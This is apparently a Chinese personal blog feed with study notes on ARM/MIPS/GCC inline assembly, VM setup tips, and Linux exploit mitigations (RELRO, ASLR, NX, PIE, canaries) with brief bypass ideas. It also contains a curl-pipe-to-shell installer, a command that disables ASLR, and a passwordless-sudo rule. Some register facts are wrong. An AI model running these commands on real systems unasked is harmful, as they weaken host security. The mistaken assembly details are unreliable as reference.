<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 仍然是使用 `b` 指令调用函数</span><br></pre></td></tr></table></figure>

<ul>
<li>栈帧相关</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ sp, fp 维护栈帧的状态, 栈向 低地址生长</span><br><span class="line"></span><br><span class="line">fp -&gt; +-------+</span><br><span class="line">      | frame |</span><br><span class="line">sp -&gt; +-------+</span><br><span class="line"></span><br><span class="line">@ push/pop 可以操作多个寄存器，甚至可以控制pc; sp自动变化</span><br><span class="line">@ 下面是常见的函数调用出现出现的gadget </span><br><span class="line">push &#123;r0-r4, lr&#125;           @ 顺序是 push r12; push r4; push r3 ...</span><br><span class="line">...</span><br><span class="line">pop &#123;r0-r4, pc&#125;            @ 顺序是  pop r0; pop r1; ...</span><br><span class="line"></span><br><span class="line">@ 等价于 push, 先计算sp的值?</span><br><span class="line">stmfd sp!, &#123;r0-r4, r12&#125;</span><br><span class="line"></span><br><span class="line">@ 等价于 pop</span><br><span class="line">ldmfd sp!, lr</span><br></pre></td></tr></table></figure>

<ul>
<li>系统中断</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 通过vector_swi/svc 获得系统调用号</span><br><span class="line">swi #imm</span><br><span class="line">svc #imm</span><br><span class="line"></span><br><span class="line">@ O(old)ABI 形式</span><br><span class="line">mov r0, #34</span><br><span class="line">swi 12</span><br><span class="line"></span><br><span class="line">@ E(extended)ABI 形式，立即数 imm被忽略,由r0决定</span><br><span class="line">mov r0, #12</span><br><span class="line">mov r1, #34</span><br><span class="line">swi 0</span><br></pre></td></tr></table></figure>

<h3 id="ARMv8"><a href="#ARMv8" class="headerlink" title="ARMv8"></a>ARMv8</h3><ul>
<li><p>与 <code>armv7</code> 存在一定的区别</p>
</li>
<li><p>64位指令集 <code>aarch64</code>, 兼容32位 <code>aarch32</code></p>
</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">aarch64: 64-bit registers and memory accesses, new instruction set；</span><br><span class="line">aarch32: backwards compatible with ARMv7-A</span><br></pre></td></tr></table></figure>

<ul>
<li>ARMv8 通用寄存器</li>
</ul>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">x0</span>-x31</span><br><span class="line"><span class="symbol">x0</span>-x7: 函数前<span class="number">8</span>个参数值</span><br><span class="line"><span class="symbol">x8:</span> 函数返回值</span><br><span class="line"><span class="symbol">x19</span>-x28: 没特殊用途 </span><br><span class="line"><span class="symbol">x29:</span> <span class="built_in">fp</span> frame pointer</span><br><span class="line"><span class="symbol">x30:</span> <span class="built_in">lr</span></span><br><span class="line"><span class="symbol">x31:</span> zr, zero register, 恒<span class="number">0</span></span><br><span class="line"><span class="symbol">x32:</span> <span class="built_in">pc</span>, 不能像armv7一样被修改</span><br><span class="line"></span><br><span class="line"><span class="comment">@ 也可使用32位的 w0...寄存器, 可扩展使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">@ sp对应的物理寄存器有如下四个(某一时刻只能对应下面其中一个)</span></span><br><span class="line"><span class="symbol">SP_EL0</span>和SP_EL1</span><br><span class="line"><span class="symbol">SP_EL2</span></span><br><span class="line"><span class="symbol">SP_EL3</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>SPSR 替代了 CPSR</p>
</li>
<li><p>内存访问</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ load &amp; store, 兼容armv7 ldr</span><br><span class="line">ldp  @ load pair 一对。</span><br><span class="line">	ldp x8, x2, [x0, #0x10]   @ 将x8&lt;-(x0+0x10), x2&lt;-(x0+0x10+8)</span><br><span class="line">stp  @ store pair</span><br></pre></td></tr></table></figure>

<ul>
<li>函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 参数传递</span><br><span class="line">x0-x7: 函数前8个参数值</span><br><span class="line">x8: 函数返回值</span><br><span class="line"></span><br><span class="line">@ aarch64没有push和pop 指令</span><br></pre></td></tr></table></figure>

<ul>
<li>系统调用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ supervisor call</span><br><span class="line">svc #imm</span><br></pre></td></tr></table></figure>

<ul>
<li>TrustZone 相关<br>xxx</li>
</ul>
<h3 id="ARMv9"><a href="#ARMv9" class="headerlink" title="ARMv9"></a>ARMv9</h3><p>xxx</p>
<h2 id="Mips"><a href="#Mips" class="headerlink" title="Mips"></a>Mips</h2><ul>
<li><p>RISC， <code>Microprocessor without Interlocked Pipeline Stages</code></p>
</li>
<li><p><code>mips</code> 是<code>big-endian</code>, mipsel是 <code>little-endian</code></p>
</li>
<li><p>格式</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 根据位数</span><br><span class="line">31-26   25-21 20-16 15-11  10-6  5-0</span><br><span class="line">op-code   rs    rt   rd    shamt func</span><br><span class="line"></span><br><span class="line"># 注释使用 `#`</span><br><span class="line"></span><br><span class="line">rd: register destination</span><br><span class="line">rt: target</span><br><span class="line">rs: source</span><br></pre></td></tr></table></figure>

<ul>
<li>通用寄存器， 32个</li>
</ul>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line">$<span class="number">0</span>-$<span class="number">31</span>          <span class="comment"># 有各自的助记符，看汇编时多使用助记符</span></span><br><span class="line"><span class="symbol">$0:</span>    $<span class="built_in">zero</span>    <span class="comment"># 恒0</span></span><br><span class="line"><span class="number">1</span>:     $<span class="built_in">at</span>      # </span><br><span class="line"><span class="number">2</span><span class="number">-3</span>:   $<span class="built_in">v0</span>-<span class="built_in">v1</span>   <span class="comment"># value 函数返回值</span></span><br><span class="line"><span class="number">4</span><span class="number">-7</span>:   $<span class="built_in">a0</span>-<span class="built_in">a3</span>   <span class="comment"># arg  函数参数</span></span><br><span class="line"><span class="number">8</span><span class="number">-15</span>:  $<span class="built_in">t0</span>-<span class="built_in">t7</span>   <span class="comment"># temp</span></span><br><span class="line"><span class="number">16</span><span class="number">-23</span>: $<span class="built_in">s0</span>-<span class="built_in">s7</span>   <span class="comment"># save 保留</span></span><br><span class="line"><span class="number">24</span><span class="number">-25</span>: $<span class="built_in">t8</span>-<span class="built_in">t9</span>   <span class="comment"># temp</span></span><br><span class="line"><span class="number">16</span><span class="number">-27</span>: $<span class="built_in">k0</span>-<span class="built_in">k1</span>   <span class="comment"># 异常或中断</span></span><br><span class="line"><span class="number">28</span>:    $<span class="built_in">gp</span>      <span class="comment"># global pointer</span></span><br><span class="line"><span class="number">29</span>:    $<span class="built_in">sp</span>      <span class="comment"># stack pointer</span></span><br><span class="line"><span class="number">30</span>:    $<span class="built_in">fp</span>, <span class="built_in">s8</span>  <span class="comment"># frame pointer </span></span><br><span class="line"><span class="number">31</span>:    $<span class="built_in">ra</span>      <span class="comment"># ret addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 特殊</span></span><br><span class="line"><span class="symbol">pc:</span> program cunter</span><br></pre></td></tr></table></figure>

<ul>
<li>指令格式</li>
</ul>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line">r: register format <span class="comment"># 使用寄存器</span></span><br><span class="line">i: immediate       <span class="comment"># 使用立即数</span></span><br><span class="line"><span class="keyword">j: </span><span class="keyword">jump</span></span><br></pre></td></tr></table></figure>

<ul>
<li>寻址</li>
</ul>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="keyword">move </span>$<span class="built_in">a0</span>, $<span class="built_in">zero</span>    <span class="comment"># a0&lt;-0</span></span><br></pre></td></tr></table></figure>

<ul>
<li>访问内存</li>
</ul>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仍然 load, store</span></span><br><span class="line"><span class="comment"># b: byte; w: word; h: half word; ...</span></span><br><span class="line"><span class="keyword">sw: </span><span class="keyword">sw </span>$<span class="built_in">ra</span>, <span class="number">0x38</span>($<span class="built_in">sp</span>)   <span class="comment"># 将$ra存入栈中 $sp+38的地方</span></span><br><span class="line"><span class="keyword">sb: </span>...</span><br><span class="line"><span class="keyword">lw: </span>...</span><br><span class="line"><span class="keyword">lb: </span>...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例子</span></span><br><span class="line"><span class="keyword">sb </span>r1, <span class="number">0</span>(R2)</span><br><span class="line"><span class="keyword">lb </span>r1, <span class="number">0</span>(r2)</span><br></pre></td></tr></table></figure>

<ul>
<li>算术</li>
</ul>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 基本算术</span></span><br><span class="line"><span class="keyword">add</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">sub</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment">; 逻辑</span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">xor</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">nor</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment">; 移位</span></span><br><span class="line"><span class="keyword">sll</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">srl</span></span><br></pre></td></tr></table></figure>

<ul>
<li>跳转</li>
</ul>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="comment">; jmp</span></span><br><span class="line"><span class="keyword">j: </span><span class="keyword">jmp </span>label</span><br><span class="line"><span class="keyword">jr: </span>用法 <span class="keyword">jr </span>$<span class="built_in">ra</span> 等</span><br><span class="line"><span class="keyword">jal: </span><span class="keyword">jmp </span><span class="keyword">and </span>link, 保存 ret <span class="keyword">addr(pc+4) </span>到 $<span class="built_in">ra</span></span><br><span class="line"><span class="keyword">jalr: </span>借用寄存器跳转，链接，常用</span><br><span class="line"></span><br><span class="line"><span class="comment">; branch, 后面需要跟操作</span></span><br><span class="line"><span class="keyword">beq: </span><span class="keyword">beq </span>$s, $t, offset   <span class="comment"># $s=$t跳转</span></span><br><span class="line"><span class="keyword">bne: </span><span class="keyword">b </span>not eq</span><br><span class="line"><span class="keyword">bltz: </span><span class="keyword">branch </span>less than <span class="built_in">zero</span></span><br></pre></td></tr></table></figure>

<ul>
<li>架构缓存<ul>
<li>有两个独立的cache: 指令 和 数据</li>
</ul>
</li>
</ul>
<h2 id="RISC-V"><a href="#RISC-V" class="headerlink" title="RISC-V"></a>RISC-V</h2><p>xxx</p>
<h2 id="GCC-Inline-Assembly"><a href="#GCC-Inline-Assembly" class="headerlink" title="GCC Inline Assembly"></a>GCC Inline Assembly</h2><p>内联汇编，我的理解是直接写 汇编语句就行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span>(<span class="string">&quot;mov $1, %eax&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>扩展内链汇编，有点不同</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span> ( assembler <span class="keyword">template</span>  </span><br><span class="line">		: output operands                   <span class="comment">/* optional 输出 */</span>  </span><br><span class="line">		: input operands                    <span class="comment">/* optional 输入*/</span>  </span><br><span class="line">		: list of clobbered registers       <span class="comment">/* optional 通知编译器可能造成寄存器或内存数据破坏，提前保护*/</span>  </span><br><span class="line">);</span><br></pre></td></tr></table></figure>


<p>某些规则，主要</p>
<ul>
<li>r: register</li>
<li>m:memory</li>
<li>常用寄存器</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">a rax/eax/ax/al</span><br><span class="line">b rbx</span><br><span class="line">c rcx</span><br><span class="line">d rdx</span><br><span class="line">S rsi</span><br><span class="line">D rdi</span><br><span class="line">I 常数值</span><br><span class="line">q,r 动态分配的寄存器</span><br><span class="line">g eax,ebx,ecx,edx或内存变量</span><br><span class="line">A 把eax和edx合成一个64位的寄存器(use long longs)</span><br></pre></td></tr></table></figure>

<ol>
<li>使用 q 指示编译器从 eax, ebx, ecx, edx 分配寄存器。 使用 r 指示编译器从 eax, ebx, ecx, edx, esi, edi 分配寄存器。</li>
<li>不必把编译器分配的寄存器放入改变的寄存器列表，因为寄存器已经记住了它们。</li>
<li><code>&quot;=&quot;</code> 是标示输出寄存器，<strong>必须这样用</strong>。</li>
<li>数字 <code>%n</code> 的用法：数字表示的寄存器是按照出现和从左到右的顺序映射到用”r”或”q”请求的寄存器．如果要重用”r”或”q”请求的寄存器的话，就可以使用它们。</li>
</ol>
<p>例子 1</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span> (</span><br><span class="line">	<span class="string">&quot;cld/n/t&quot;</span>  </span><br><span class="line">	<span class="string">&quot;rep/n/t&quot;</span>  </span><br><span class="line">	<span class="string">&quot;stosl&quot;</span>  </span><br><span class="line">	: <span class="comment">/* no output registers */</span>  </span><br><span class="line">	: <span class="string">&quot;c&quot;</span> (count), <span class="string">&quot;a&quot;</span> (fill_value), <span class="string">&quot;D&quot;</span> (dest)  </span><br><span class="line">	: <span class="string">&quot;%edi&quot;</span> </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// intel 格式：count 等都是变量</span></span><br><span class="line">push edi</span><br><span class="line">mov ecx, count</span><br><span class="line">mov eax, fill_value</span><br><span class="line">mov edi, dest</span><br><span class="line">cld</span><br><span class="line">rep</span><br><span class="line">stosl</span><br></pre></td></tr></table></figure>

<p>例子2：加入数字</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__asm__ (</span><br><span class="line">	<span class="string">&quot;push %%rax&quot;</span></span><br><span class="line">	<span class="string">&quot;pop %0&quot;</span></span><br><span class="line">	: <span class="string">&quot;=m&quot;</span>(var)</span><br><span class="line">	: <span class="string">&quot;c&quot;</span>(count)</span><br><span class="line">	: memory</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://learningos.cn/ucore_os_webdocs/lab0/lab0_2_3_1_3_gcc_inline_asm.html">GCC 基本内联汇编 · GitBook (learningos.cn)</a></p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>asm</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机配置</title>
    <url>/2023/09/17/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<blockquote>
<p>个人常用虚拟机配置，持续更新。。。</p>
</blockquote>
<span id="more"></span>

<h2 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h2><ul>
<li>下载</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install zsh</span><br><span class="line"></span><br><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>

<ul>
<li>插件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-syntax-highlighting</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>

<ul>
<li>修改zshrc</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">	git </span><br><span class="line">	zsh-syntax-highlighting </span><br><span class="line">	zsh-autosuggestions</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>主题</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改zshrc</span></span><br><span class="line">ZSH_THEME=powerlevel10k/powerlevel10k</span><br></pre></td></tr></table></figure>

<h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><ul>
<li>下载，解压，将 ttf 文件放入 一下文件夹</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给用户自己用</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/.fonts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全部用户</span></span><br><span class="line">/usr/share/fonts</span><br></pre></td></tr></table></figure>

<ul>
<li>执行命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkfontscale</span><br><span class="line">sudo mkfontdir</span><br><span class="line">sudo fc-cache</span><br></pre></td></tr></table></figure>

<h2 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹"></a>共享文件夹</h2><ul>
<li>挂载了，但是不显示</li>
</ul>
<h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><ul>
<li>mount</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other</span><br></pre></td></tr></table></figure>

<ul>
<li>&#x2F;etc&#x2F;fstab</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> .host:/ /mnt/hgfs fuse.vmhgfs-fuse allow_other 0 0</span><br></pre></td></tr></table></figure>

<h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><ul>
<li>mount</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other</span><br></pre></td></tr></table></figure>

<ul>
<li>&#x2F;etc&#x2F;fstab</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmhgfs-fuse /mnt/hgfs/ fuse defaults,allow_other 0 0</span><br></pre></td></tr></table></figure>

<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><ul>
<li>安装</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install docker.io</span><br><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure>

<ul>
<li>当前用户加入docker组</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo usermod -aG docker <span class="variable">$USER</span>  </span><br><span class="line">newgrp docker</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>


<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><ul>
<li>出现获得不了IP地址的情况</li>
</ul>
<ol>
<li>kali 修改 <code>/etc/network/interfaces</code></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找网卡名</span></span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 interfaces 文件</span></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">/etc/init.d/networking restart</span><br><span class="line">ifconfig eth0 down    </span><br><span class="line">ifconfig eth0 up</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>ubuntu 使用命令，但是重启后又不行</li>
</ol>
<ul>
<li>ifconfig 配置IP</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig ens33 &lt;IP&gt; netmask &lt;mask&gt;</span><br><span class="line">route add default gw &lt;gateway&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>然后使用如下命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /sbin/dhclient</span><br></pre></td></tr></table></figure>


<ol start="3">
<li>ubuntu 修改 文件</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/netplan/01-network-manager-all.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改内容</span></span><br><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">     eth0:</span><br><span class="line">       dhcp4: <span class="built_in">yes</span></span><br><span class="line">       addresses: []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line">sudo netplan try</span><br><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>

<ul>
<li>在修改 <code>/etc/NetworkManager/NetworkManager.conf</code> 配置文件的 <code>managed = true</code></li>
<li>reboot</li>
<li>后来看了这个文章解决 <a href="https://www.zhangguojian.com/2020/11/27/ubuntu-vmware-workstation-can-not-connect-network/#%E6%89%8B%E5%8A%A8%E8%8E%B7%E5%8F%96-ip">Ubuntu20.04不能连接网络及解决开机自动获取 ip 问题</a></li>
</ul>
<ol start="4">
<li>如下命令</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmcli networking off </span><br><span class="line">sudo nmcli networking on</span><br></pre></td></tr></table></figure>

<h2 id="sudo-免密"><a href="#sudo-免密" class="headerlink" title="sudo 免密"></a>sudo 免密</h2><ul>
<li>修改 <code>/etc/sudoers</code> 添加用户或者组</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定命令免密</span></span><br><span class="line">&lt;name&gt; ALL=(ALL:ALL) NOPASSWD:/bin/useradd,/bin/chown</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有的都免密</span></span><br><span class="line">&lt;name&gt; ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>

<h2 id="内存问题"><a href="#内存问题" class="headerlink" title="内存问题"></a>内存问题</h2><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><ul>
<li><p><strong>删除快照后任显示存在快照，如何删除干净</strong>：新建一个，然后删除，VM会把之前的快照合并后删除。</p>
<ul>
<li><a href="https://kb.vmware.com/s/article/1023657?lang=zh_CN">删除所有快照和整合快照功能常见问题解答(vmware.com)</a></li>
</ul>
</li>
<li><p>当我们删除部分大文件时，发现自己磁盘的内存没有增加。vmdk文件不会主动回缩，需要手动做shrink。并且不能有快照</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo vmware-toolbox-cmd disk list</span><br><span class="line">$ sudo vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure>

<ul>
<li>然后重启</li>
</ul>
<h2 id="kali-无法进入console"><a href="#kali-无法进入console" class="headerlink" title="kali 无法进入console"></a>kali 无法进入console</h2><ul>
<li>我的情况是 fstab 出现问题，共享文件夹修改 fstab</li>
</ul>
<ol>
<li>重启，进入 grub加载项</li>
<li>e 进入配置</li>
</ol>
<p>![[..&#x2F;imgs&#x2F;Pasted image 20230929200253.png]]</p>
<ol start="3">
<li>修改 linux 中的 ro &#x3D;&gt; <code>rw</code> 并加入一句 <code>init=/bin/bash</code></li>
<li>f10 进入系统</li>
<li>修改 fstab，重启重新获得界面</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li>zsh 自带插件 <a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins">Plugins · ohmyzsh&#x2F;ohmyzsh Wiki</a></li>
</ul>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>VM</tag>
      </tags>
  </entry>
  <entry>
    <title>程序保护机制</title>
    <url>/2023/08/26/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<blockquote>
<p>程序保护机制学习</p>
</blockquote>
<span id="more"></span>

<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><h4 id="relro"><a href="#relro" class="headerlink" title="relro"></a>relro</h4><p>read only relocation: 由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p>
<ul>
<li>比如说 got表，在完全开启后只读，我们无法修改修改函数 got 表的内容从而改变函数的执行过程。</li>
</ul>
<p>gcc 选项</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-z norelro   <span class="comment"># 关闭</span></span><br><span class="line">-z lazy      <span class="comment"># 部分开启</span></span><br><span class="line">-z now       <span class="comment"># 完全开启</span></span><br></pre></td></tr></table></figure>

<h4 id="aslr"><a href="#aslr" class="headerlink" title="aslr"></a>aslr</h4><p>Address Space Layout Randomization, 这种技术使得系统上运行的进程的内存地址无法被预测，使得与这些进程有关的漏洞变得更加难以利用。配合 PIE 保护从而得到最好的效果</p>
<p>Linux上ASLR分为0&#x2F;1&#x2F;2三级，用户可以通过内核参数randomize_va_space进行等级控制，对应效果如下：</p>
<ul>
<li>0：没有随机化，即关闭ASLR</li>
<li>1：保留的随机化，即<strong>共享库、栈、mmap()以及VSDO将被随机化</strong></li>
<li>2：完全的随机化，在1的基础上，<strong>通过brk分配的内存空间(heap通过此系统调用获得)也将随机化</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span>  /proc/sys/kernel/randomize_va_space</span><br><span class="line">  2</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>在使用 gdb 软件调试时可以关闭此保护，从而在调试时获得的地址一致。</p>
<p>因为存在一定的地址随机化，所以在漏洞利用时不能使用固定的函数地址。比如没开 aslr 保护system函数(共享库中的函数)地址是 0x1234。开启aslr时system函数位置会改变，从而利用失败。</p>
<h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>No-eXecute 不可执行。和DEP(Data Execute Protector)一致</p>
<p>将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
<p>gcc参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-z execstack    <span class="comment"># 栈可执行</span></span><br><span class="line">-z noexecstack  <span class="comment"># 开启</span></span><br></pre></td></tr></table></figure>

<p>bypass: 杜绝了一定写shellcode的利用，但是可以使用**ROP(Return-oriented programming)**来bypass，造成我们想要的攻击效果。</p>
<h4 id="pie"><a href="#pie" class="headerlink" title="pie"></a>pie</h4><p>Position independent code, 位置无关代码，默认开启。<br>针对代码段.text, 数据段，.data，.bss等固定地址的一个防护技术。同ASLR一样，应用了PIE的程序会在每次加载时都变换加载基址，从而使位于程序本身的gadget也失效</p>
<p>没有PIE保护的程序，每次加载的基址都是固定的，64位上一般是0x400000。</p>
<p>gcc 参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-no-pie    <span class="comment"># 关闭pie</span></span><br><span class="line">-pie       <span class="comment"># 开启pie</span></span><br></pre></td></tr></table></figure>

<p>开启aslr，我们可以获得text段的gadget，并且可以使用。但是开其pie保护后，text随机化，我们寻找的gadget也需要加上一个偏移才能使用。</p>
<ul>
<li>bypass<ul>
<li>partial write: 由于内存的页载入机制，PIE的随机化只能<strong>影响到单个内存页</strong>。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位是始终不变的。因此通过覆盖部分内容比如后8位从而劫持函数执行流。<ul>
<li>leak: 程序本身的漏洞可以泄露某些函数地址，从而获得程序加载的基地址。</li>
</ul>
</li>
<li>vdso&#x2F;vsyscall: 系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall。在某些版本中，这个地址不会改变，并且不受保护的影响。vsyscall 内存页中包含了三个系统调用。而且这三个系统调用对程序运行基本没有影响，也就是说我们获得了三个已知地址的 ret。相当可以执行 <code>ret</code> 指令，获得：查看程序的映射 <code>cat /proc/&lt;pid&gt;/maps</code>。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__vsyscall_page:</span><br><span class="line"> mov $__NR_gettimeofday, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line"> .balign <span class="number">1024</span>, <span class="number">0xcc</span></span><br><span class="line"> mov $__NR_time, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line"> .balign <span class="number">1024</span>, <span class="number">0xcc</span></span><br><span class="line"> mov $__NR_getcpu, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure>

<h4 id="stack-canary"><a href="#stack-canary" class="headerlink" title="stack canary"></a>stack canary</h4><p>当启用 canary 保护后，函数开始执行的时候会先往栈里<strong>插入 cookie 信息</strong>，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在栈溢出覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
<p>Linux canary 最后一字节为 <code>\x00</code></p>
<p>gcc 开启和关闭的参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-fno-stack-protector   <span class="comment"># 关闭，默认没有canary</span></span><br><span class="line"></span><br><span class="line">-fstack-protector          <span class="comment"># 保护函数中通过alloca()分配缓存以及存在大于8字节的buffer。保护能力有限，不会保护所有的函数</span></span><br><span class="line">-fstack-protector-all      <span class="comment"># 启用堆栈保护，为所有函数插入保护代码</span></span><br><span class="line">-fstack-protector-strong   <span class="comment"># 编译参数让保护的范围更广</span></span><br></pre></td></tr></table></figure>

